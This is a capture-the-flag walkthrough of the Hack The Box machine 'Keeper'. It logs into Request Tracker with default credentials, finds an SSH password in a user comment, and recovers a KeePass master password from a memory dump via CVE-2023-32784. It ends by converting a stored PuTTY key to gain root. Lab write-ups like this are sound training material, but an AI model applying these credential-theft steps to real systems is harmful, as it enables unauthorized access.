# Keeper

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 10.129.207.151          
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-13 22:12 +08
Warning: 10.129.207.151 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.207.151
Host is up (0.16s latency).
Not shown: 65393 closed tcp ports (conn-refused), 140 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

We can start proxying traffic through Burpsuite.

### Web Enumeration -> SSH Creds

Visiting the website itself shows a domain we need to add:

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

After adding to the `/etc/hosts` file, it brings us to a login page:

<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

The website was running Best Practical Request Tracker (RT) 4.4.4, which is quite outdated. A bit of research reveals that `root:password` is the default password, which works here:

<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

There is 1 ticket present, and it's an issue regarding Keepass (with the box name being an obvious hint).&#x20;

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

The attachment has been removed. There's also mention of another user named `lnorgaard`. When we use the Admin panel to view all Users, there's a password located within the user's comments:

<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

Using these creds, we can `ssh` in as the user:

<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Keepass Dump -> CVE-2023-32784

Within the user's directory, there's one `zip` file present:

```
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt
```

Within it is the `.dmp` file for the Keepass client mentioned in the ticket earlier. I searched for Keepass exploits for 2023, and found this one:

{% embed url="https://sysdig.com/blog/keepass-cve-2023-32784-detection/" %}

This exploits allows us to get passwords from Keepass dump files, and there is one PoC for it:

{% embed url="https://github.com/vdohney/keepass-password-dumper" %}

We can clone the repository and clean it up a bit. Afterwards, use `scp` to transfer the file out:

```
scp lnorgaard@keeper.htb:~/KeePassDumpFull.dmp .
```

Then, in order to run the binary, I had to change the dependencies from `net7.0` to `net6.0` within the `.csproj` file:

```markup
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

</Project>
```

Afterwards, we can use `dotnet run` to execute the program:

```
$ dotnet run KeePassDumpFull.dmp
Password candidates (character positions):
Unknown characters are displayed as "●"
1.:     ●
2.:     ,, l, `, -, ', ], A, I, :, =, _, c, M, 
3.:     d, 
4.:     g, 
5.:     r, 
6.:     ●
7.:     d, 
8.:      , 
9.:     m, 
10.:    e, 
11.:    d, 
12.:     , 
13.:    f, 
14.:    l, 
15.:    ●
16.:    d, 
17.:    e, 
Combined: ●{,, l, `, -, ', ], A, I, :, =, _, c, M}<REDACTEDSTRING>
```

This would produce a string at the end with some non-printable characters. Googling part of the string reveals a certain Danish dessert (based on the username of the user):

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Using the name of the dessert, we can access the passwords within the `.kdbx` file:

```
$ kpcli --kdb=passcodes.kdbx 
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> ls
=== Groups ===
passcodes/
```

### Keepass PPX Key -> Root SSH Key

There are quite a few entries within this Keepass instance:

```
kpcli:/passcodes> ls *
/passcodes/eMail:

/passcodes/General:

/passcodes/Homebanking:

/passcodes/Internet:

/passcodes/Network:
=== Entries ===
0. keeper.htb (Ticketing Server)                                          
1. Ticketing System                                                       

/passcodes/Recycle Bin:
=== Entries ===
2. Sample Entry                                               keepass.info
3. Sample Entry #2                          keepass.info/help/kb/testform.

/passcodes/Windows:
```

Within the `keeper.htb` entry, there's a key of some sorts, as well as a fake password for `root`:

```
kpcli:/passcodes/Network> show -f 0

Title: keeper.htb (Ticketing Server)
Uname: root
 Pass: <TRUNCATED>
  URL: 
Notes: PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-20230519
       Public-Lines: 6
       AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
       <TRUNCATED>
```

This is a Putty User Key File, which can be converted back to an `ssh` key.&#x20;

{% embed url="https://superuser.com/questions/232362/how-to-convert-ppk-key-to-openssh-key-under-linux" %}

```
$ puttygen key.ppk -O private-openssh -o sshkey.rsa
$ cat sshkey.rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAp1arHv4TLMBgUULD7AvxMMsSb3PFqbpfw/K4gmVd9GW3xBdP
<TRUNCATED>
```

After running `chmod 600` on it, we can use this private key to `ssh` in as `root`:

<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

`dotnet run` saves loads of time transferring files to a Windows machine. Rooted!&#x20;
